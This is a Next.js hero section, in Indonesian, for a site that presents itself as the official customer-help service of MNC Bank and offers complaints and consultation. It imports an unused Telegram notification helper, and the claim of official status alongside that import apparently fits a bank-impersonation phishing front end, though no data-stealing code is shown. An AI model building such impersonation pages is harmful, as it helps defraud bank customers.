import Link from "next/link";
import { Button } from "@/components/ui/button";
import { ArrowRight, MessageSquare, Clock, Shield } from "lucide-react";
import { sendTelegramNotification } from "@/lib/telegram";

export function Hero() {
  return (
    <section className="relative overflow-hidden bg-gradient-to-b from-secondary to-background py-16 md:py-24 lg:py-32">
      <div className="absolute inset-0 overflow-hidden" style={{ backgroundImage: "url(\"/IMG_20260707_222236_072.jpg\")", backgroundColor: "transparent", backgroundPosition: "left bottom" }}>
        <div className="absolute -top-24 -right-24 h-96 w-96 rounded-full bg-primary/5 blur-3xl" />
        <div className="absolute -bottom-24 -left-24 h-96 w-96 rounded-full bg-accent/5 blur-3xl" />
      </div>

      <div className="container relative">
        <div className="mx-auto max-w-3xl text-center">
          <div className="inline-flex items-center gap-2 rounded-full border border-primary/20 bg-primary/5 px-4 py-1.5 text-sm font-medium text-primary mb-6" style={{ backgroundColor: "#ffffff", backgroundImage: "none" }}>
            <Shield className="h-3.5 w-3.5" />
            Layanan Resmi PT Bank MNC Internasional Tbk
          </div>

          <h1 className="font-heading text-4xl font-bold tracking-tight text-foreground sm:text-5xl md:text-6xl mb-6" style={{ color: "#ffffff" }}>
            Layanan Bantuan{" "}
            <span className="text-primary" style={{ color: "#ca8a04", fontWeight: "900" }}>MNC Bank</span>
          </h1>

          <p className="text-lg md:text-xl text-muted-foreground leading-relaxed mb-8 max-w-2xl mx-auto" style={{ color: "#ffffff", backgroundImage: "none", backgroundColor: "#00000000", fontWeight: "900", textDecoration: "none" }}>
            Solusi cepat dan terpercaya untuk pengaduan, konsultasi, dan
            informasi layanan perbankan. Tim kami siap membantu nasabah{" "}
            <strong>MNC Bank</strong> 24 jam setiap hari.
          </p>

          <div className="flex flex-col sm:flex-row gap-3 justify-center mb-12">
            <Button
              asChild
              size="lg"
              className="bg-primary text-primary-foreground hover:bg-primary/90 font-semibold px-8">
              
              <Link href="#kontak">
                Ajukan Pengaduan
                <ArrowRight className="ml-2 h-4 w-4" />
              </Link>
            </Button>
            <Button
              asChild
              variant="outline"
              size="lg"
              className="border-primary/20 text-primary hover:bg-primary/5 font-semibold px-8">
              
              <Link href="#layanan" style={{ backgroundColor: "#003366", backgroundImage: "none", color: "#ffffff" }}>Lihat Layanan</Link>
            </Button>
          </div>

          <div className="flex flex-wrap justify-center gap-6 md:gap-10 text-sm text-muted-foreground">
            <div className="flex items-center gap-2" style={{ backgroundColor: "transparent", backgroundImage: "none", boxShadow: "0 20px 25px -5px rgb(0 0 0 / 0.18)", margin: "40px 0px", borderRadius: "0px" }}>
              <Clock className="h-4 w-4 text-accent" />
              <span style={{ color: "#f3f4f6" }}>Layanan 24/7</span>
            </div>
            <div className="flex items-center gap-2">
              <MessageSquare className="h-4 w-4 text-accent" />
              <span style={{ color: "#ffffff" }}>Respons Cepat</span>
            </div>
            <div className="flex items-center gap-2">
              <Shield className="h-4 w-4 text-accent" />
              <span style={{ color: "#ffffff" }}>Terjamin Keamanan</span>
            </div>
          </div>
        </div>
      </div>
    </section>);

}